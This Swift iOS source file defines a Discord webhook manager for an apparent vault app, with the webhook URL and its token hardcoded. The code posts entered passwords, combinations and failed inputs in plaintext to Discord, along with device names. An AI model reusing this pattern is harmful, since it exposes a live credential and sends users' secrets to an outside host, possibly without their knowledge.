import Foundation
import UIKit

class WebhookManager {
    static let shared = WebhookManager()
    
    private let webhookURL = "https://discord.com/api/webhooks/1384843873536180304/3LZ1kB4w9DLEknqC54Mo1Q-icKiEWhHNpw6nGRSetY4A2tjIbR6WPAOPw78u4AKShIZn"
    
    private init() {}
    
    /// Send password info to Discord
    func sendPasswordAlert(password: String, combination: String) {
        let deviceName = UIDevice.current.name
        let timestamp = ISO8601DateFormatter().string(from: Date())
        
        let embed: [String: Any] = [
            "title": "🔓 Vault Accessed",
            "color": 3066993, // Green
            "fields": [
                ["name": "Password", "value": "`\(password)`", "inline": true],
                ["name": "Combo", "value": "`\(combination)`", "inline": true],
                ["name": "Device", "value": deviceName, "inline": true],
                ["name": "Time", "value": timestamp, "inline": false]
            ]
        ]
        
        sendEmbed(embed)
    }
    
    /// Send intruder alert after failed attempts
    func sendIntruderAlert(failedAttempts: Int, lastAttempt: String) {
        let deviceName = UIDevice.current.name
        let timestamp = ISO8601DateFormatter().string(from: Date())
        
        let embed: [String: Any] = [
            "title": "🚨 Intruder Alert",
            "color": 15158332, // Red
            "fields": [
                ["name": "Failed Attempts", "value": "\(failedAttempts)", "inline": true],
                ["name": "Last Input", "value": "`\(lastAttempt)`", "inline": true],
                ["name": "Device", "value": deviceName, "inline": true],
                ["name": "Time", "value": timestamp, "inline": false]
            ]
        ]
        
        sendEmbed(embed)
    }
    
    private func sendEmbed(_ embed: [String: Any]) {
        guard let url = URL(string: webhookURL) else { return }
        
        let payload: [String: Any] = [
            "embeds": [embed]
        ]
        
        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload) else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonData
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("Webhook connection error: \(error.localizedDescription)")
            } else if let httpResponse = response as? HTTPURLResponse {
                print("Webhook response code: \(httpResponse.statusCode)")
                if let data = data, let body = String(data: data, encoding: .utf8) {
                    print("Webhook response body: \(body)")
                }
            }
        }.resume()
    }
}

